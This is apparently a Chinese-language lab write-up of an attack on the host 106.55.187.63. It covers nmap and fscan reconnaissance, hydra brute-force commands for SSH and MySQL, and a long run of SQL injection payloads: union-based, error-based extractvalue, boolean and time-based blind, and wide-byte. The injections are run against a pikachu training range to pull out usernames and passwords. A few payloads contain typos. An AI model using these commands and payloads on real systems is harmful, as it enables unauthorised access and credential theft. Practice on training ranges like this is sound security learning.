一：爆破目标主机服务器

目标主机 106.55.187.63

一：信息收集

1.使用nmap扫描目标主机

命令

nmap -T4 -A -v 106.55.187.63
1.主机系统

llinux操作系统

2.开放端口

2.fscan扫描

命令

fscan.exe -h 106.55.187.63

发现web网站

http://106.55.187.63:8002      //登录
http://106.55.187.63:8001      //pikachu靶场

二:漏洞利用

一:端口爆破

ssh服务

端口：2222

攻击方式：爆破(hydra) ，弱口令

hydra  -L user.txt -P password.txt -vV -t 5 ssh://106.55.187.63:2222

MySql数据库

端口：3306

攻击方式：爆破(hydra) ，弱口令

hydra  -L user.txt -P password.txt -vV -t 5 mysql://106.55.187.63:3306
DNS服务

端口：53

攻击方式：区域传输漏洞

Apache

端口：8001

攻击方式：爆破，弱口令

三：sql注入练习

1.字符型注入

单引号判断注入点和类型

报错回显 ‘’’

单引号闭合的字符型注入

2.判断字段数

判断字段数为 2

3.3.使用 mysql 命令 select database()命令返回当前的数据库

4.利用 information_schema 查询 security 数据库的所有表

5.查询 security 数据库中 users 中的所有字段

6.查询登录名称及密码

2.数字型注入

1.burp 抓包测试字段数位 2

2.使用 mysql 命令 select database()命令返回当前的数据库

3.抓包查询利用 information_schema 查询 security 数据库的所有表

4.查询 security 数据库中 users 中的所有字段

5.查询登录名称及密码

3.xxx型注入

单引号判断是否有注入点和注入类型。直接出现报错。报错内容为 ‘1’’)

该类型为字符型注入

暂时可判定运行代码

select * from xxxx where name=（'$name')

尝试进行构造万能语句

1')  or  '1'='1' or ('

通过闭合爆出字段数,从一开始依次递增 ，到3时出现数字不存在，说明 字段数为2

') order by 3#

使用union联合查询查出数据库为pikachu

') union select 1,database()#

查询数据库中的表依次查询

') union select table_name,2 from information_schema.tables  where table_schema=database() limit 0,1#

查看pikachu数据库中users表中的字段

') union select column_name,2 from information_schema.columns  where table_schema=database() and table_name='users'limit 2,1#

产看用户名和密码

') union select username,password from pikachu.users#

4.”insert/pdate”注入

1.insert登录页面注入

单引号报错说明存在漏洞

通过报错注入爆出数据库

' or extractvalue(1,concat(0x7e,(select database()))) or'

爆出表名

' or extractvalue(1,concat(0x7e,(select concat(table_name) from information_schema.tables where table_schema=database() limit 2,1))) or'

再次构建爆出列名

' or extractvalue(1,concat(0x7e,(select concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' limit 2,1))) or'

产看账户密码

'or extractvalue(1,substr(concat(0x7e,(select group_concat(username,password) from users limit 0,1),0x7e),1,32))or'

2.update注入

性别加入单引号发生错，从报错可以判断存在注入点，并且为整型

构建payload 爆出数据库为pikachu

'nd extractvalue(1,concat(0x7e,(database()),0x7e))%23

获取数据库中的表

' and extractvalue(1,concat(0x7e,(select table_name from
information_schema.tables where table_schema='pikachu' limit 0,1),0x7e))%23

获取users表中的字段

' and extractvalue(1,concat(0x7e,(select column_name from
information_schema.columns where table_schema='pikachu'and table_name'users' limit 0,1),0x7e))%23

获取密码

'and extractvalue(1,substr(concat(0x7e,(select group_concat(username,password) from users limit 0,1),0x7e),1,32))#

5.delete注入

删除留言进行抓包，发现了id为get传参方式可能是注入点加单引号尝试是否会报错

出现报错说明这是一个注入点

尝试使用报错注入

尝试构建pyload

and extractvalue(1,concat(0x7e,(select database())))

成功爆出数据库

继续构建pyload 爆出表名

and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))

爆出列名

and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)))

查询用户名和密码

and extractvalue(1,concat(0x7e,substr((select group_concat(concat(username)) from users),1,31)))

and extractvalue(1,concat(0x7e,substr((select group_concat(concat(password)) from users),1,31)))

6.基于boolian的盲注

单引号测试是否有注入点，

kobe ‘ and 1=1

查看数据库的长度，构建pyload

kobe' and length(database())=7 #

数据库长度为7

判断字符内容

kobe' and ascii(substr((database()),1,1))=112 #			//p

依次判断

数据库为pikachu

7.基于时间的盲注

单引号判断是否存在注入页面返回正常

kobe’ and sleep(5)

测试是否有注入点

利用if函数判断当前数据库长度

kobe'and if(length(database())=7,sleep(5),0)#

通过页面返回时间判断截取字符的ascii码

kobe' and if(ascii(substr((select database()),1,1)=112),sleep(5),0)#  //p
kobe' and if(ascii(substr((select database()),2,1)=105),sleep(5),0)#  //i
kobe' and if(ascii(substr((select database()),3,1)=107),sleep(5),0)#  //k
kobe' and if(ascii(substr((select database()),4,1)=97),sleep(5),0)#  //a
kobe' and if(ascii(substr((select database()),5,1)=99),sleep(5),0)#  //c
kobe' and if(ascii(substr((select database()),6,1)=104),sleep(5),0)#  //h
kobe' and if(ascii(substr((select database()),7,1)=117),sleep(5),0)#  //u

8.宽字节注入

原理当数据带入时被反斜杠转义

构造语句

%81' or 1=1 #

因为是post传参使用burp抓包发送

产生回显

%81' union select 1,2 #

爆出数据库

%81' union select 1,database() #

表名

%81' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database())#

字段名

%81' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=(select database()) and table_name=(select table_name from information_schema.tables where table_schema=(select database())limit 3,1))#

查询账号密码

%81' union select username,password from users #
